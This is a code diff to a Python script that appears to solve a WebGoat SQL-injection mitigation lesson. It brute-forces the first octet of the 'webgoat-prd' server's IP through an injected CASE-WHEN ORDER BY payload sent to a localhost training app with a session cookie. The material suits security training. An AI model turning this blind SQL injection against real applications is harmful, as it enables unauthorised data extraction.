@@ -5,8 +5,9 @@ import re
 import json
 
 WebGoatIP = '127.0.0.1:8080'
-URL = 'http://{}/WebGoat/SqlInjection/servers?column={}' #FIXME
-JSESSIONID = '166548C2EC5DEFB28CF677503338BE4F' #FIXME
+# http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=ip
+URL = 'http://{}/WebGoat/SqlInjectionMitigations/servers?column={}' #FIXME
+JSESSIONID = 'cEIWCjUyeUcjIiAqAII1wzraXfUe3qFMiK_aWzvr' #FIXME
 
 regEx = re.compile('\* [0-9]+\-[0-9]+')
 
@@ -66,7 +67,7 @@ def bruteForce():
     (case when (select ip from servers where hostname='webgoat-prd') = '{}' then
     id else hostname end)
     """
-    for i in range(1, 255): # check for values between 1 and 254.130.219.202
+    for i in range(1, 255): # check for values between 1 and 254 .130.219.202
         ip = '{}.130.219.202'.format(i)
         if getRequest(sortBy.format(ip), False):
             print('Success!')
